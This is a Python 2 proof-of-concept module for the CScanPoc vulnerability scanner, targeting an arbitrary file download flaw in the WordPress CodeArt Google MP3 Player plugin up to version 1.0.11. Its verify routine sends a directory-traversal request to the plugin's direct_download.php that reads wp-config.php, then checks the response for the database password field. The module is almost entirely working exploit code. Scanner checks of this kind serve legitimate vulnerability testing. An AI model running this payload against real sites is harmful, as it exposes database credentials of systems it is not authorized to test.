# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib
import urllib2


class Vuln(ABVuln):
    vuln_id = 'WordPress_0014'  # 平台漏洞编号，留空
    name = 'WordPress CodeArt Google MP3 Player Plugin 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-12-03'  # 漏洞公布时间
    desc = '''
         WordPress CodeArt Google MP3 Player Plugin has file download in do/direct_download.php.
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/35460/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress CodeArt Google MP3 Player Plugin <=1.0.11'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '35f3da58-cda1-4ab4-abd2-8dbac9d0503f'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = 'file=../../../wp-config.php'
            path = '/wp-content/plugins/google-mp3-audio-player/direct_download.php?'
            verify_url = self.target + path + payload
            request = urllib2.Request(verify_url)

            response = urllib2.urlopen(request)
            reg = re.compile("DB_PASSWORD")
            if reg.findall(response.read()):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
